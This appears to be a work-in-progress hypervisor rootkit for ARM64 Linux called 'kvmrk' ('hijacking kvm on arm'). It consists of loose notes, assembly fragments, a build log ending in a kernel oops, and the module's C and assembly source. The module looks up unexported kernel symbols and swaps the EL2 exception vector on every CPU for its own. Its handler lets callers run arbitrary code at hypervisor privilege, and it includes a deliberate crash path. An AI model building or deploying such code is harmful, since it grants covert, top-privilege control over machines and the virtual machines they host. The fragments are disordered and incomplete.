
 + debug register writes ruin everything, save written value somewhere and show it when read
 + reading __kvm_hyp_vector from el1 breaks everything, set watchpoint on over-written instruction

!! vectors must be aligned !!

 + overwrite target for el1_sync to physical address of handle_trap_el1
 + trap accesses to mdcr_el2 as well


 switch (x0) {
     case KVMRK_CALL_HYP:
         ((void (*)(void)) x1)();
         break;
     // case KVMRK_RESET_VECTORS:
     //     asm volatile("ldr x5, =__hyp_stub_vectors\n\t");
     //     asm volatile("msr vbar_el2, x5\n\t");
     //     break;
 }


 SYM_CODE_START_LOCAL(handle_trap_el1)
 	cmp 	x0, #KVMRK_CALL_HYP
 	b.ne 	1f
 	br		x1
 	eret
 1:
 	cmp     x0, #KVMRK_CRASH_EVERYTHING
 	b.ne	1f
 	add 	x0, xzr, xzr
 	ldr 	x0, [x0]
 	eret
 2:
 	eret
 SYM_CODE_END(handle_trap_el1)




 /*
 x10 *hopefully* wont get clobbered by HVC_RESET_VECTORS
 see: https://elixir.bootlin.com/linux/latest/source/arch/arm64/kernel/hyp-stub.S#L200
 */
 SYM_FUNC_START(kvmrk_replace_vbar_el2)
     add     x19, xzr, x0
     mov     x0, #HVC_RESET_VECTORS
     hvc     #0

     mov     x0, #HVC_SET_VECTORS
     add     x1, xzr, x19
     hvc     #0
     ret
 SYM_FUNC_END(kvmrk_replace_vbar_el2)



 DO ON EACH CPU


 SYM_FUNC_START(kvmrk_crash_everything)
     mov     x0, #KVMRK_CRASH_EVERYTHING
     hvc     #0
     ret
 SYM_FUNC_END(kvmrk_crash_everything)




 AS [M]  /mnt/vectors.o
 LD [M]  /mnt/kvmrk.o
 MODPOST /mnt/Module.symvers
 CC [M]  /mnt/kvmrk.mod.o
 LD [M]  /mnt/kvmrk.ko
 BTF [M] /mnt/kvmrk.ko
Skipping BTF generation for /mnt/kvmrk.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-5.15.0-79-generic'
objdump -d kvmrk.ko > kvmrk.objdump
root@ubuntu:/mnt# make insmod
sudo dmesg -C
sudo insmod kvmrk.ko
[  593.755214] kernel BUG at arch/arm64/kernel/traps.c:498!
[  593.756483] Internal error: Oops - BUG: 0 [#1] SMP
[  593.756696] Modules linked in: kvmrk(OE+) tls binfmt_misc nls_iso8859_1 drm dm_multipath scsi_dh_rdac scsi_dh_emc
scsi_dh_alua efi_pstore sch_fq_codel ip_tables x_tables autofs4 btrfs blake2b_generic zstd_compress raid10 raid456 as
ync_raid6_recov async_memcpy async_pq async_xor async_tx xor xor_neon raid6_pq libcrc32c raid1 raid0 multipath linear
crct10dif_ce ghash_ce sha2_ce sha256_arm64 sha1_ce virtio_net net_failover failover virtio_blk aes_neon_bs aes_neon_
blk aes_ce_blk crypto_simd cryptd aes_ce_cipher
[  593.758247] CPU: 0 PID: 2393 Comm: insmod Tainted: G           OE     5.15.0-79-generic #86-Ubuntu
[  593.758433] Hardware name: QEMU QEMU Virtual Machine, BIOS 0.0.0 02/06/2015
[  593.758645] pstate: 00400005 (nzcv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
[  593.758782] pc : do_undefinstr+0x70/0x74
[  593.759129] lr : do_undefinstr+0x3c/0x74
[  593.759188] sp : ffff80000b793870
[  593.759246] x29: ffff80000b793870 x28: ffff00000334c100 x27: 0000000000000000
[  593.759385] x26: ffff8000015450c0 x25: ffff80000a81da48 x24: ffff80000a81dc90
[  593.759479] x23: 0000000020400005 x22: ffff800001542fa0 x21: 00000000b02a8000
[  593.759571] x20: ffff80000a069008 x19: ffff80000b7938c0 x18: 0000000000000000
[  593.759650] x17: 6e69666661746573 x16: 5f64656863732063 x15: 6e756620646e756f
[  593.759737] x14: 6620656d616e5f70 x13: 3039313832313830 x12: 3030303866666666
[  593.759823] x11: 2040207974696e69 x10: ffff80000b793978 x9 : ffff800008322e0c
[  593.759904] x8 : ffff80000b793950 x7 : ffff80000b793970 x6 : 0000000000000000
[  593.759996] x5 : ffff80000b7938c0 x4 : ffff80000a82c630 x3 : 0000000000000000
[  593.760097] x2 : 0000000000000000 x1 : ffff00000334c100 x0 : 0000000020400005
[  593.760291] Call trace:
[  593.760477]  do_undefinstr+0x70/0x74
[  593.760553]  el1_undef+0x60/0xc0
[  593.760600]  el1h_64_sync_handler+0x84/0xd0
[  593.760651]  el1h_64_sync+0x7c/0x80
[  593.760694]  kvmrk_reset_vectors+0x4/0x1064 [kvmrk]
[  593.761084]  do_one_initcall+0x4c/0x250
[  593.761139]  do_init_module+0x50/0x260
[  593.761193]  load_module+0x9fc/0xbe0
[  593.761235]  __do_sys_finit_module+0xa8/0x114
[  593.761292]  __arm64_sys_finit_module+0x28/0x3c
[  593.761345]  invoke_syscall+0x78/0x100
[  593.761401]  el0_svc_common.constprop.0+0x54/0x184
[  593.761469]  do_el0_svc+0x30/0xac
[  593.761514]  el0_svc+0x48/0x160
[  593.761558]  el0t_64_sync_handler+0xa4/0x130
[  593.761611]  el0t_64_sync+0x1a4/0x1a8
[  593.761751] Code: f9400bf3 a8c27bfd d50323bf d65f03c0 (d4210000)
[  593.762134] ---[ end trace ea358eb9740d4227 ]---
[  594.385955] ------------[ cut here ]------------
[  594.386134] WARNING: CPU: 0 PID: 0 at kernel/rcu/tree.c:613 rcu_eqs_enter.constprop.0+0x68/0x70
[  594.386257] Modules linked in: kvmrk(OE+) tls binfmt_misc nls_iso8859_1 drm dm_multipath scsi_dh_rdac scsi_dh_emc
scsi_dh_alua efi_pstore sch_fq_codel ip_tables x_tables autofs4 btrfs blake2b_generic zstd_compress raid10 raid456 as
ync_raid6_recov async_memcpy async_pq async_xor async_tx xor xor_neon raid6_pq libcrc32c raid1 raid0 multipath linear
crct10dif_ce ghash_ce sha2_ce sha256_arm64 sha1_ce virtio_net net_failover failover virtio_blk aes_neon_bs aes_neon_
blk aes_ce_blk crypto_simd cryptd aes_ce_cipher
[  594.386896] CPU: 0 PID: 0 Comm: swapper/0 Tainted: G      D    OE     5.15.0-79-generic #86-Ubuntu
[  594.387008] Hardware name: QEMU QEMU Virtual Machine, BIOS 0.0.0 02/06/2015
[  594.387098] pstate: 204000c5 (nzCv daIF +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
[  594.387180] pc : rcu_eqs_enter.constprop.0+0x68/0x70
[  594.387243] lr : rcu_idle_enter+0x18/0x24
[  594.387296] sp : ffff80000a813d40
[  594.387334] x29: ffff80000a813d40 x28: 00000000b02b0018 x27: 0000000000000000
[  594.387432] x26: 00000000b7b40320 x25: 00000000b7b402c0 x24: 00000000bf715438
[  594.387530] x23: 0000000000030000 x22: ffff80000a828a00 x21: ffff80000a828a00
[  594.387623] x20: 0000000000000000 x19: ffff80000a069008 x18: 0000000000000000
[  594.387711] x17: 0000000000000000 x16: 0000000000000000 x15: 0000000000000000
[  594.387796] x14: ffff80000a85bf68 x13: ffff80000a85ba50 x12: 0000000000000000
[  594.387880] x11: 000000000000000c x10: 0000000000000bf0 x9 : ffff8000090f5670
[  594.387966] x8 : ffff80000a829650 x7 : 0000000000000000 x6 : 0000000000000010
[  594.388049] x5 : 00000000410fd080 x4 : 0000000000033982 x3 : ffff800075b62000
[  594.388142] x2 : 4000000000000002 x1 : 4000000000000000 x0 : ffff00007fbdf900
[  594.388232] Call trace:
[  594.388266]  rcu_eqs_enter.constprop.0+0x68/0x70
[  594.388327]  rcu_idle_enter+0x18/0x24
[  594.388370]  default_idle_call+0x40/0x150
[  594.388420]  cpuidle_idle_call+0x174/0x200
[  594.388471]  do_idle+0xac/0x100
[  594.388515]  cpu_startup_entry+0x30/0x70
[  594.388563]  rest_init+0xec/0x120
[  594.388605]  arch_call_rest_init+0x18/0x24
[  594.388658]  start_kernel+0x4b4/0x4ec
[  594.388704]  __primary_switched+0xbc/0xc4
[  594.388812] ---[ end trace ea358eb9740d4228 ]---
make: *** [Makefile:14: insmod] Segmentation fault (core dumped)
root@ubuntu:/mnt# ./emulate.sh: line 1: 208793 Aborted


#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/smp.h>
#include <asm/kvm_host.h>

#include "include/kvmrk.h"
#include "include/resolve_kallsyms.h"

typedef long (*sched_setaffinity_t)(pid_t pid, const struct cpumask *in_mask);

static sched_setaffinity_t _sched_setaffinity = NULL;

long kvmrk_sched_setaffinity(pid_t pid, const struct cpumask *in_mask) {
    if (!_sched_setaffinity) {
        _sched_setaffinity = rk_kallsyms_lookup_name("sched_setaffinity");
    }

    return _sched_setaffinity(pid, in_mask);
}


extern char kvmrk_vector[];
extern void kvmrk_set_vectors(phys_addr_t phys_vector_base);
extern int kvmrk_reset_vectors(void);

void *kvmrk__guest_exit_panic;
void *kvmrk_overflow_stack;
void *kvmrk_hyp_panic_bad_stack;
void *kvmrk_handle_trap;
void *kvmrk_hyp_panic;
void *kvmrk_nvhe_hyp_panic_handler;


void *kvm_hyp_ctxt;
struct kvm_host_data kvm_host_data;
void *kvm_get_kimage_voffset;
s64 kvm_nvhe_sym(hyp_physvirt_offset);
#define hyp_physvirt_offset CHOOSE_NVHE_SYM(hyp_physvirt_offset)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("hijacking kvm on arm");
MODULE_VERSION("0.01");

static int __init kvmrk_init(void) {
    printk(KERN_INFO "kvmrk: module loaded\n");

    kvmrk__guest_exit_panic = rk_kallsyms_lookup_name("__guest_exit_panic");
    kvmrk_overflow_stack = rk_kallsyms_lookup_name("overflow_stack");
    kvmrk_hyp_panic_bad_stack = rk_kallsyms_lookup_name("hyp_panic_bad_stack");
    kvmrk_handle_trap = rk_kallsyms_lookup_name("handle_trap");
    kvmrk_hyp_panic = rk_kallsyms_lookup_name("hyp_panic");
    kvmrk_nvhe_hyp_panic_handler = rk_kallsyms_lookup_name("nvhe_hyp_panic_handler");

    kvm_hyp_ctxt = rk_kallsyms_lookup_name("kvm_hyp_ctxt");
    kvm_host_data = *((struct kvm_host_data *) rk_kallsyms_lookup_name("kvm_host_data"));
    kvm_get_kimage_voffset = rk_kallsyms_lookup_name("kvm_get_kimage_voffset");

    int i;
    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_reset_vectors();
        printk(KERN_INFO "kvmrk: reset vectors of cpu %i to hyp stub\n", smp_processor_id());
    }

    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_set_vectors(__pa_symbol(kvmrk_vector));
        printk(KERN_INFO "kvmrk: set vectors of cpu %i to kvmrk stub\n", smp_processor_id());
    }
    printk(KERN_INFO "kvmrk: replaced vbar_el2 on all cpus\n");

    // asm volatile("mov       x0, 5\n\t");
    // asm volatile("hvc       #0\n\t");
    // register unsigned long r asm("x0");
    // printk(KERN_INFO "kvmrk: hvc returned %lx\n", r);

    return 0;
}

static void __exit kvmrk_exit(void) {
    printk(KERN_INFO "kvmrk: module unloaded\n");
}

module_init(kvmrk_init);
module_exit(kvmrk_exit);


/* SPDX-License-Identifier: GPL-2.0-only */
/*
 * Copyright (C) 2020 - Google Inc
 * Author: Andrew Scull <ascull@google.com>
 */

#include <linux/init.h>
#include <linux/linkage.h>

#include <asm/assembler.h>
#include <asm/el2_setup.h>
#include <asm/kvm_arm.h>
#include <asm/kvm_asm.h>
#include <asm/ptrace.h>
#include <asm/virt.h>
#include <asm/kvm_mmu.h>

#include "include/kvmrk.h"

	.text

SYM_FUNC_START(__host_exit)
	get_host_ctxt	x0, x1

	/* Store the host regs x2 and x3 */
	stp	x2, x3,   [x0, #CPU_XREG_OFFSET(2)]

	/* Retrieve the host regs x0-x1 from the stack */
	ldp	x2, x3, [sp], #16	// x0, x1

	/* Store the host regs x0-x1 and x4-x17 */
	stp	x2, x3,   [x0, #CPU_XREG_OFFSET(0)]
	stp	x4, x5,   [x0, #CPU_XREG_OFFSET(4)]
	stp	x6, x7,   [x0, #CPU_XREG_OFFSET(6)]
	stp	x8, x9,   [x0, #CPU_XREG_OFFSET(8)]
	stp	x10, x11, [x0, #CPU_XREG_OFFSET(10)]
	stp	x12, x13, [x0, #CPU_XREG_OFFSET(12)]
	stp	x14, x15, [x0, #CPU_XREG_OFFSET(14)]
	stp	x16, x17, [x0, #CPU_XREG_OFFSET(16)]

	/* Store the host regs x18-x29, lr */
	save_callee_saved_regs x0

	/* Save the host context pointer in x29 across the function call */
	mov	x29, x0
	bl	kvmrk_handle_trap

	/* Restore host regs x0-x17 */
__host_enter_restore_full:
	ldp	x0, x1,   [x29, #CPU_XREG_OFFSET(0)]
	ldp	x2, x3,   [x29, #CPU_XREG_OFFSET(2)]
	ldp	x4, x5,   [x29, #CPU_XREG_OFFSET(4)]
	ldp	x6, x7,   [x29, #CPU_XREG_OFFSET(6)]

	/* x0-7 are use for panic arguments */
__host_enter_for_panic:
	ldp	x8, x9,   [x29, #CPU_XREG_OFFSET(8)]
	ldp	x10, x11, [x29, #CPU_XREG_OFFSET(10)]
	ldp	x12, x13, [x29, #CPU_XREG_OFFSET(12)]
	ldp	x14, x15, [x29, #CPU_XREG_OFFSET(14)]
	ldp	x16, x17, [x29, #CPU_XREG_OFFSET(16)]

	/* Restore host regs x18-x29, lr */
	restore_callee_saved_regs x29

	/* Do not touch any register after this! */
__host_enter_without_restoring:
	eret
	sb
SYM_FUNC_END(__host_exit)

/*
 * void __noreturn __host_enter(struct kvm_cpu_context *host_ctxt);
 */
SYM_FUNC_START(__host_enter)
	mov	x29, x0
	b	__host_enter_restore_full
SYM_FUNC_END(__host_enter)

/*
 * void __noreturn __hyp_do_panic(struct kvm_cpu_context *host_ctxt, u64 spsr,
 * 				  u64 elr, u64 par);
 */
SYM_FUNC_START(__hyp_do_panic)
	/* Prepare and exit to the host's panic funciton. */
	mov	lr, #(PSR_F_BIT | PSR_I_BIT | PSR_A_BIT | PSR_D_BIT |\
		      PSR_MODE_EL1h)
	msr	spsr_el2, lr
	adr_l	lr, kvmrk_nvhe_hyp_panic_handler
	hyp_kimg_va lr, x6
	msr	elr_el2, lr

	mov	x29, x0

	/* Load the panic arguments into x0-7 */
	mrs	x0, esr_el2
	mov	x4, x3
	mov	x3, x2
	hyp_pa	x3, x6
	get_vcpu_ptr x5, x6
	mrs	x6, far_el2
	mrs	x7, hpfar_el2

	/* Enter the host, conditionally restoring the host context. */
	cbz	x29, __host_enter_without_restoring
	b	__host_enter_for_panic
SYM_FUNC_END(__hyp_do_panic)

.macro host_el1_sync_vect
	.align 7
.L__vect_start\@:
	stp	x0, x1, [sp, #-16]!
	b	__host_exit
.L__vect_end\@:
.if ((.L__vect_end\@ - .L__vect_start\@) > 0x80)
	.error "host_el1_sync_vect larger than vector entry"
.endif
.endm

.macro invalid_host_el2_vect
	.align 7

	/*
	 * Test whether the SP has overflowed, without corrupting a GPR.
	 * nVHE hypervisor stacks are aligned so that the PAGE_SHIFT bit
	 * of SP should always be 1.
	 */
	add	sp, sp, x0			// sp' = sp + x0
	sub	x0, sp, x0			// x0' = sp' - x0 = (sp + x0) - x0 = sp
	tbz	x0, #PAGE_SHIFT, .L__hyp_sp_overflow\@
	sub	x0, sp, x0			// x0'' = sp' - x0' = (sp + x0) - sp = x0
	sub	sp, sp, x0			// sp'' = sp' - x0 = (sp + x0) - x0 = sp

	/* If a guest is loaded, panic out of it. */
	stp	x0, x1, [sp, #-16]!
	get_loaded_vcpu x0, x1
	cbnz	x0, kvmrk__guest_exit_panic
	add	sp, sp, #16

	/*
	 * The panic may not be clean if the exception is taken before the host
	 * context has been saved by __host_exit or after the hyp context has
	 * been partially clobbered by __host_enter.
	 */
	b	kvmrk_hyp_panic

.L__hyp_sp_overflow\@:
	/* Switch to the overflow stack */
	adr_this_cpu sp, kvmrk_overflow_stack + OVERFLOW_STACK_SIZE, x0

	b	kvmrk_hyp_panic_bad_stack
	ASM_BUG()
.endm

.macro invalid_host_el1_vect
	.align 7
	mov	x0, xzr		/* restore_host = false */
	mrs	x1, spsr_el2
	mrs	x2, elr_el2
	mrs	x3, par_el1
	b	__hyp_do_panic
.endm

/*
 * The host vector does not use an ESB instruction in order to avoid consuming
 * SErrors that should only be consumed by the host. Guest entry is deferred by
 * __guest_enter if there are any pending asynchronous exceptions so hyp will
 * always return to the host without having consumerd host SErrors.
 *
 * CONFIG_KVM_INDIRECT_VECTORS is not applied to the host vectors because the
 * host knows about the EL2 vectors already, and there is no point in hiding
 * them.
 */
	.align 11
SYM_CODE_START(kvmrk_vector)
	invalid_host_el2_vect			// Synchronous EL2t
	invalid_host_el2_vect			// IRQ EL2t
	invalid_host_el2_vect			// FIQ EL2t
	invalid_host_el2_vect			// Error EL2t

	invalid_host_el2_vect			// Synchronous EL2h
	invalid_host_el2_vect			// IRQ EL2h
	invalid_host_el2_vect			// FIQ EL2h
	invalid_host_el2_vect			// Error EL2h

	host_el1_sync_vect			// Synchronous 64-bit EL1/EL0
	invalid_host_el1_vect			// IRQ 64-bit EL1/EL0
	invalid_host_el1_vect			// FIQ 64-bit EL1/EL0
	invalid_host_el1_vect			// Error 64-bit EL1/EL0

	host_el1_sync_vect			// Synchronous 32-bit EL1/EL0
	invalid_host_el1_vect			// IRQ 32-bit EL1/EL0
	invalid_host_el1_vect			// FIQ 32-bit EL1/EL0
	invalid_host_el1_vect			// Error 32-bit EL1/EL0
SYM_CODE_END(kvmrk_vector)

SYM_FUNC_START(kvmrk_set_vectors)
	mov		x1, x0
	mov		x0, #HVC_SET_VECTORS
	hvc		#0
	ret
SYM_FUNC_END(kvmrk_set_vectors)

SYM_FUNC_START(kvmrk_reset_vectors)
	mov		x0, #HVC_RESET_VECTORS
	hvc		#0
	ret
SYM_FUNC_END(kvmrk_reset_vectors)
